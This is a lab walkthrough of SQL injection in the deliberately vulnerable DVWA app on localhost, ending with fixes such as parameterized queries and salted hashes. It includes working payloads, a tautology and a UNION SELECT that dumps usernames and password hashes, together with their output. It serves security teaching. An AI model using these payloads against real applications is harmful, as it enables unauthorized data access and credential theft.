# Walkthrough: SQL injection in DVWA

DVWA (Damn Vulnerable Web Application) is the `dvwa` target in this lab
(`http://127.0.0.1:8081`). This walks through its classic SQL injection, from
dumping every row to pulling out password hashes, then the fix.

> Authorized-use-only. DVWA is intentionally vulnerable and bound to localhost.
> Never run these payloads against an application you do not own.

## Setup

```bash
labctl up
```

Open `http://127.0.0.1:8081`, log in with `admin` / `password`, click
**Create / Reset Database** on the setup page, then set **DVWA Security** to
**low** (the level `labctl set-level dvwa low` also sets).

Go to **SQL Injection**. The form asks for a *User ID* and runs, server-side:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id'
```

The `$id` is dropped straight into the query inside single quotes.

## 1. Break out and return every row

Enter this as the User ID:

```
1' OR '1'='1
```

The `WHERE` clause becomes `user_id = '1' OR '1'='1'`, which is true for every
row, so the whole table comes back:

```
First name: admin     Surname: admin
First name: Gordon    Surname: Brown
First name: Hack      Surname: Me
First name: Pablo     Surname: Picasso
First name: Bob       Surname: Smith
```

## 2. Pull data from another table with UNION

The query returns two columns, so a `UNION SELECT` with two columns can read
anything the database user can see — including the credentials table:

```
1' UNION SELECT user, password FROM users#
```

The `#` comments out the trailing quote. Now the "name" fields carry usernames
and password hashes:

```
First name: admin     Surname: 5f4dcc3b5aa765d61d8327deb882cf99
First name: gordonb   Surname: e99a18c428cb38d5f260853678922e03
First name: 1337      Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
First name: pablo     Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
First name: smithy    Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

Those are unsalted MD5 hashes. `5f4dcc3b5aa765d61d8327deb882cf99` is MD5 of
`password` — a lookup table cracks it instantly, and `admin` and `smithy` share
it. From here an attacker has working logins.

## Why it works, and the fixes

| Weakness | Fix |
| --- | --- |
| User input concatenated into SQL | Use a **parameterized query** (`WHERE user_id = ?`) so input is never parsed as SQL. DVWA's **impossible** level does exactly this. |
| `UNION` could read the credential table | Least privilege: the app's DB user should not be able to read password storage it doesn't need. |
| Unsalted MD5 passwords | Store a salted, slow hash (`bcrypt`/`argon2`); a dump then isn't instantly crackable. |

Raise DVWA's security to **high** or **impossible** and re-run step 1 — the same
payload now returns nothing, because the input is bound as data.

Every payload above was run against the lab's own DVWA instance on localhost.
